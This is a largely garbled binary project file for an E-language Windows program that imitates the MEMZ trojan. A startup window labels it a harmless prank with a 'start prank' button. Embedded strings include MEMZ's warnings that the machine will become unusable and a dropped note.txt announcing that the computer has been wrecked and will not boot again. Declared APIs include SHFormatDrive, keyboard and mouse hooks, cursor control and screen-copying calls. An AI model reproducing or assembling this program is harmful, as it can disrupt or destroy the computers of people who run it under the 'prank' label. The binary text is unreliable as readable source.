CNWTEPRGs埻
s 嫉溪Ｅ突盼s s s s s            <                                                                                                s龌us 犆壕Ｅ位盼s s s s s            X                                                                                                                                  s,s 捞噪な协盼s s s s s          廇閣H                                              R�爠     	   _启动窗口   在程序启动后自动调入本窗口   �          �   
  �                           �^
2   2   |  �                                                                   ���                                                                               7  
                      提示  p.^
   �   L                                                                          ��� ��� ���  �  �          ��� ��� ���            <   ����            �     �"Microsoft YaHei UI ������-Ev�1Ev    8   提示：本程序为恶搞程序，而非恶意程序，提示信息请勿当真！        �                         开始恶搞  P/^
�   ^   P                                                                              <   ����            �     �"Microsoft YaHei UI ������-Ev�1Ev   开始恶搞            s箎�>s 捞与盼s s s s s s          �?`�3                                          � ?�   �               l   9   krnlnd09f2340818511d396f6aaf844c7e32557系统核心支持库A   shell52F260023059454187AF826A3C07AF2A30操作系统界面功能支持库                     爠 R       窗口程序集_启动窗口                      癌�楔�            _开始恶搞_被单击                            &   �  �  �  �  �       &     �  �     �        �        +  j4               68  9    R7  k                6!&               6!�               6!               66   The software you just executed is considered malware.   <   This malware will harm your computer and makes it unusable.   G   If you are seeing this message without knowing what you just executed,   )   simply press No and nothing will happen.   D   If you know what this malware does and are using a safe environment       to test, press Yes to start it.     5   DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN      UNUSABLE MACHINE? !               6      @      H@   MEMZ  l k                6!&               6!�               6!               6   THIS IS THE LAST WARNING!     9   THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING      THIS MALWARE!      STILL EXECUTE IT? !               6      @      H@   MEMZ  l j ��          6Pj4               68  9    R7��Qrj    ��          6Pj4               68  9    R7��Qrj    ��          6            文本文档                            �  �  �  �  �  �  �                  �  j�               6!               6!              6      &@
   \note.txt !f               6!               62   YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.     #   Your computer won't boot up again,      so use it as long as you can!        :D     1   Trying to kill MEMZ will cause your system to be   )   destroyed instantly, so don't try it :D  j             6  !               6!              6      &@
   \note.txt j    ��          6              @
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
[
\
]
^
_
`
a
@磩P拕 拕眲腊�p皠 皠跋�`蟿蟿牢�p蝿 蝿型��蛣0蛣嗵�愄�@虅鹚�犓�P藙 藙笆�`蕜蕜郎�p蓜 蓜腥��葎0葎嗲�惽�     �   UnhookWindowsHookEx       user32          bE        �   hHook       �   SetWindowPos       user32       �   cEdEeEfEgEhEiE       -   ;   I   X   g       �   hwnd      �   hWndInsertAfter  
    �   x  
    �   y      �   cx      �   cy      �   wFlags       �   GetWindowRect       user32       4   jEkE           �   hwnd     �A  lpRect       �   GetWindowLong       user32   GetWindowLongA   4   lEmE           �   hwnd      �   nIndex       �   GetCurrentThreadId       kernel32                 �   SetWindowsHookEx       user32   SetWindowsHookExA   l   nEoEpEqE       $   5       �   idHook       �   lpfn      �   hmod      �   dwThreadId       �   GetWindowDC   ,
   user32.dll   GetWindowDC      rE        �   窗口句柄       �   ClientToScreen   , 非零表示成功，零表示失败
   user32.dll   ClientToScreen   m   sEtE    3   /    �   窗口句柄 hwnd，要取出区域坐标的窗口句柄 &   �A   位置变量 lpPoint，参见相关帮助           SetCursorPos   鼠标_置位置 
   user32.dll   SetCursorPos   6   uEvE           �   横坐标      �   纵坐标       �	   LoadImageB   载入一个位图、图标或指针  执行成功则返回对象的一个句柄；零表示失败   user32
   LoadImageA   �  wExEyEzE{E|E    Z   \  �     9  V    �   实例句柄 要从其中载入图象的DLL或应用程序模块或实例句柄。零表示装载一幅固有图象 �     �   图象名 欲载入图象的名字。如指定了hInst，就用这个参数指定资源或资源的标志符（标志符是一个长整数）。如hInst为空，而且已指定了LR_LOADFROMFILE，那么这个参数代表文件名（位图、图标或指针文件）。如果是个Long型值，这个参数就代表固有位图、图标或指针的编号 _    �   图象类型 下述常数之一，指定了欲载入的图象类型：IMAGE_BITMAP， IMAGE_CURSOR， IMAGE_ICON ]    �   图象宽度 要求的图象宽度和高度。图象会根据情况自动伸缩。如设为零，表示用图象的默认大小     �   图象高度 同上 F    �   常数组合 下述常数的任意组合，它们都在api32.txt文件中得到了定义      �   LoadIcon�   从指定的模块或应用程序实例中载入一个图标。其中，LoadIconBynum是LoadIcon函数的类型安全声明　执行成功则返回已载入的图标的句柄；零表示失败。会设置GetLastError   user32	   LoadIconA   =   }E~E           �   hInstance      �   lpIconName       �   InvalidateRectd   这个函数屏蔽一个窗口客户区的全部或部分区域。这会导致窗口在事件期间部分重画　非零表示成功，零表示失败   user32   InvalidateRect     E�E�E    !   �       �   hwnd 待屏蔽窗口的句柄 �    �   lpRect RECT，用于描述待屏蔽矩形部分的一个矩形结构。可用InvalidateRectBynum函数，同时将lpRect设为零（Long数据类型），从而屏蔽（或禁用）整个窗口 :    �   bErase TRUE（非零）导致指定的区域在重画前先删除;        �   DrawIconD   在指定的位置画一个图标　非零表示成功，零表示失败。会设置GetLastError   user32   DrawIcon   �   �E�E�E�E       B   T       �   hdc 设备场景 &    �   x 想描绘图标的位置（逻辑坐标）     �   y 同上     �   hIcon 欲描绘图标的句柄;      �   GetDC9   获取指定窗口的设备场景　指定窗口的设备场景句柄，出错则为0   user32   GetDC   U   �E    I    �   hwnd 将获取其设备场景的窗口的句柄。若为0，则要获取整个屏幕的DC;        �	   ReleaseDC~   释放由调用GetDC或GetWindowDC函数获取的指定设备场景。它对类或私有设备场景无效（但这样的调用不会造成损害）　执行成功为1，否则为0   user32	   ReleaseDC   f   �E�E    /   +    �   hwnd 要释放的设备场景相关的窗口句柄 #    �   hdc 要释放的设备场景句柄;        �   SendMessage�   调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。SendMessageBynum， ;    SendMessageByString是该函数的“类型安全”声明形式　由具体的消息决定   user32   SendMessageA   �   �E�E�E�E    +   H   i   '    �   hwnd 要接收消息的那个窗口的句柄     �   wMsg 消息的标识符     �   wParam 具体取决于消息     �   lParam 具体取决于消息;      �   UpdateWindow�   强制立即更新窗口，窗口中以前屏蔽的所有区域都会重画（在vb里使用：如vb窗体或控件的任何部分需要更新，可考虑直接使用refresh方法　非零表示成功，零表示失败   user32   UpdateWindow   *   �E        �   hwnd 欲更新窗口的句柄;      �   DeleteObject�   用这个函数删除GDI对象，比如画笔、刷子、字体、位图、区域以及调色板等等。对象使用的所有系统资源都会被释放　非零表示成功，零表示失败   gdi32   DeleteObject   0   �E    $    �   hObject 一个GDI对象的句柄;       �   CreateWaitableTimerA   程序延时   kernel32.dll   CreateWaitableTimerA   g   �E�E�E       7       �   lpTimerAttributes       �   bManualReset      �   lpTimerName      �   SetWaitableTimer       kernel32.dll   SetWaitableTimer   �   �E�E�E�E�E�E       (   <   ]   �       �   hTimer     �A   pDueTime      �   lPeriod      �   pfnCompletionRoutine  !    �   lpArgToCompletionRoutine       �   fResume      �   MsgWaitForMultipleObjects    
   User32.dll   MsgWaitForMultipleObjects   �   �E�E�E�E�E       (   =   X       �   nCount      �  pHandles       �   fWaitAll      �   dwMilliseconds      �   dwWakeMask       �   CloseHandle  关闭一个内核对象。其中包括文件、文件映射、进程、线程、安全和同步对象等。涉及文件处理时，这个函数通常与vb的close命令相似。应尽可能的使用close，因为它支持vb的差错控制。注意这个函数使用的文件句柄与vb的文件编号是完全不同的  非零表示成功，零表示失败。会设置GetLastError   kernel32.dll   CloseHandle   4   �E    (    �   对象句柄 欲关闭的一个对象的句柄;      �	   复制位图_�   , StretchBlt，将一幅位图从一个设备场景复制到另一个。源和目标DC相互间必须兼容。这个函数会在设备场景中定义一个目标矩形，并在位图中定义一个源图象。源矩形会根据需要进行伸缩，以便与目标矩形的大小相符	   gdi32.dll
   StretchBlt   9  �E�E�E�E�E�E�E�E�E�E�E    .   o   �   �   3  �  �    �  y  *    �   目标设备场景句柄 hdc，目标设备场景 =    �   目标横坐标 x，目标矩形左上角的x,y坐标，以逻辑坐标表示 =    �   目标纵坐标 y，目标矩形左上角的x,y坐标，以逻辑坐标表示 =    �   目标宽度 nWidth，目标矩形的宽度和高度，以逻辑坐标表示 >    �   目标高度 nHeight，目标矩形的宽度和高度，以逻辑坐标表示 S    �   源设备场景句柄 hSrcDC，源设备场景。如光栅运算未指定一个源，则这个参数应为零 =    �   源横坐标 xSrc，用源DC的逻辑坐标表示的源矩形左上角位置 =    �   源纵坐标 ySrc，用源DC的逻辑坐标表示的源矩形左上角位置 �    �   源宽度 nSrcWidth，分别指定用逻辑单位（以源DC为基础）传输的一幅图象的宽度和高度。如其中有一个参数的符号（指正负号）与对应的目标参数不符，位图就会在对应的轴上作镜像转换处理 �    �   源高度 nSrcHeight，分别指定用逻辑单位（以源DC为基础）传输的一幅图象的宽度和高度。如其中有一个参数的符号（指正负号）与对应的目标参数不符，位图就会在对应的轴上作镜像转换处理 d    �   光栅运算 dwRop，传输过程中进行的光栅运算。如刷子属于光栅运算的一部分，就使用选入目标DC的刷子     �   ShellExecuteA	   文件_执行   shell32.dll   ShellExecuteA   p  �E�E�E�E�E�E    d   �     �  �  `    �   hwnd 指定一个窗口的句柄，有些时候，Windows程序有必要在创建自己的主窗口前显示一个消息框。 w     �   lpOperation 指定字串“Open”来打开lpFlie文档；或指定“Print”来打印它。也可设为vbNullString，表示默认为“Open” ;     �   lpFile 想用关联的程序打印或打开的一个程序名或文件名 �     �   lpParameters 如lpFile是一个可执行文件，则这个字串包含了传递给执行程序的参数。如lpFile引用的是一个文档文件，或者不需要使用参数，则设为vbNullString ,     �   lpDirectory 想使用的默认路径完整路径 Q    �   nShowCmd 定义了如何显示启动程序的常数值。参考ShowWindow函数的nCmdShow参数      �   LocalSize_取内存大小   返回本地内存块大小   kernel32	   LocalSize      �E       �A   hMem             RegisterClassEx_注册窗口类R   该函数为随后在调用Createwindow函数和CreatewindowEx函数中使用的窗口注册一个窗口类。   user32   RegisterClassExA   !   �E       �A   pcWndClassEx       �   GetModuleHandle_取模块句柄f   获取一个应用程序或动态链接库的模块句柄  如执行成功成功，则返回模块句柄。零表示失败。会设置GetLastError   kernel32   GetModuleHandleA   �   �E    z    �   lpModuleName 指向程序模块的名称(可以是.DLL或是.exe文件)，如果没有后缀名，则默认是.dll。若为0则取本程序的模块向柄。      �   DefWindowProc   调用缺省窗口过程   user32   DefWindowProcA   h   �E�E�E�E       "   5       �   hwnd      �   wMsg      �   wParam      �   lParam       �   CreateWindowEx_创建窗口   建立窗口   user32   CreateWindowExA     �E�E�E�E�E�E�E�E�E�E�E�E    *   �    \  y  �  �  �  Y  �  �  &    �   dwExStyle 指定窗口的扩展风格。 �    �   lpClassName 指向一个空结束的字符串，它指定了窗口的类名。这个类名可以是任何用函数RegisterClassEx注册的类名，或是任何预定义的控制类名，如按钮（Button）、静态（Static）、编择（Edit）、滚动条（ScrollBar）、列表框（ListBox）、组合框（ComboBox）、日期（SysDateTimePick32）、月历（SysMonthCal32）、热键（msctls_hotdey32）、列表（SysListView32）。参考对话框定义。 如果应用程序创建一个MDI客户窗口,则使用由Windows预先注册的类 "MDICLIENT"  /     �   lpWindowName 窗口的标题，结尾不能有空格 C    �   dwStyle 指定创建窗口的风格。该参数属性可以参考下列 dwStyle      �   x 定义窗口的X坐标     �   y 定义窗口的Y坐标     �   nWidth 定义窗口的宽度     �   nHeight 定义窗口的高度 |    �   hWndParent 指向被创建窗口的父窗口。若要创建一个子窗口或一个被属窗口，需提供一个有效的窗口句柄。如果是父窗口，可以为0 A    �   hMenu 菜单句柄，或依据窗口风格指明一个子窗口标识，没有就0 9    �   hInstance 与窗口相关联的模块事例的句柄。，没有就0 �    �   lpParam 指向一个值的指针，该值传递给窗口 WM_CREATE消息。该值通过在lParam参数中的CREATESTRUCT结构传递。如果应用程序创建一个MDI客户窗口，则lpParam必须指向一个CLIENTCREATESTRUCT结构。 一般为NULL，一般为0      �
   GetMessage   从线索消息队列中返回一条消息   user32   GetMessageA   w   �E�E�E�E       #   =      �A   lpMsg      �   hwnd      �   wMsgFilterMin      �   wMsgFilterMax       �   TranslateMessage   转换虚拟关键字消息   user32   TranslateMessage      �E       �A   lpMsg       �   DispatchMessage   向窗口发送消息   user32   DispatchMessageA      �E       �A   lpMsg      �   FindWindowExA   取子窗口句柄
   user32.dll   FindWindowExA   �   �E�E�E�E    1   X   v   -    �   hWndParent 父窗口要搜索其子窗口的句柄 #    �   hWndChildAfter 子窗口的句柄     �   lpszClass 窗口类名     �   lpszWindow 窗口名称      �   SHFormatDrive       shell32.dll   SHFormatDrive   �   �E�E�E�E       \   n       �   hWnd 当前窗口句柄 ;    �   Drive 要格式化的驱动器，0代表A盘，1代表B盘,依此类推     �   fmtID  C    �   Options1 改变对话框的默认选项。0表示默认，1表示选中快速格式                                         s’CJs ∽藉Ｅ禄盼<s s s s s                                                                s仉}Ds 栗楼罚佛盼s s s s s                                                               s踹財s 躺吵恭墩ｒ匙s s s s s         �8n �                                              V   �  �A;A
 
 
 
� A� A� A� A� A 
 
 
 
 
 
 
 
 
 
  
! 
" 
# 
$ 
% 
& 
' 
( 
) 
* 
+ 
, 
- 
. 
/ 
0 
1 
2 
3 
4 
5 
6 
7 
<A=A>A?A� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
�A�A�A�Ar.r.浑趣遭
r.咨砢	W�M� U�S�G�G�GHS�G?C"S�L�
LI	IDW	GgR�
S/U�DjC�S�MyC"竬
S�L�
R�GvD�CR
G�T�DUF�S�咨砢	W�M� U�S�G�G�GHS�G?C"S�L�
LI	IDW	GgR�
S/U�DjC�S�MyC"竬
S�L�
R�GvD�CR
G�T�DUF�S�咨砢	W�M� r  H               #   )   2   =   A   U   b   p   ~   �   �   �   �   �   �   �   �   �   �         +  @  Q  k  w  �  �  �  �  �  �         ,  :  M  S  \  g  k    �  �  �  �  �  �  �  �  �        %  /  ;  H  U  j  {  �  �  �  �  �  �      *  5  F  V  d  w  }  �  �  画图标_ 取设备场景_ 载入图标_ rect 坐标_ 程序延时 WNDCLASSEX MSG UnhookWindowsHookEx SetWindowPos GetWindowRect GetWindowLong GetCurrentThreadId SetWindowsHookEx GetWindowDC ClientToScreen SetCursorPos LoadImage LoadIcon InvalidateRect DrawIcon GetDC ReleaseDC SendMessage UpdateWindow DeleteObject CreateWaitableTimerA SetWaitableTimer MsgWaitForMultipleObjects CloseHandle 复制位图_ ShellExecuteA LocalSize_取内存大小 RegisterClassEx_注册窗口类 GetModuleHandle_取模块句柄 DefWindowProc CreateWindowEx_创建窗口 GetMessage TranslateMessage DispatchMessage FindWindowExA SHFormatDrive rect 坐标_ 程序延时 WNDCLASSEX MSG UnhookWindowsHookEx SetWindowPos GetWindowRect GetWindowLong GetCurrentThreadId SetWindowsHookEx GetWindowDC ClientToScreen SetCursorPos LoadImage LoadIcon InvalidateRect DrawIcon GetDC ReleaseDC SendMessage UpdateWindow DeleteObject CreateWaitableTimerA SetWaitableTimer MsgWaitForMultipleObjects CloseHandle 复制位图_ ShellExecuteA LocalSize_取内存大小 RegisterClassEx_注册窗口类 GetModuleHandle_取模块句柄 DefWindowProc CreateWindowEx_创建窗口 GetMessage TranslateMessage DispatchMessage FindWindowExA SHFormatDrive rect 坐标_ 程序延时 WNDCLASSEX MSG                 ����s�s 	锣荡Ｅ苹盼;s 	s 	s 	s 	s         T�7                                                  R      �              � �         s苄#s 
栓茔Ｅ呕盼;s 
s 
s 
s 
s   	       @                                            R      ss s                                 
                                                       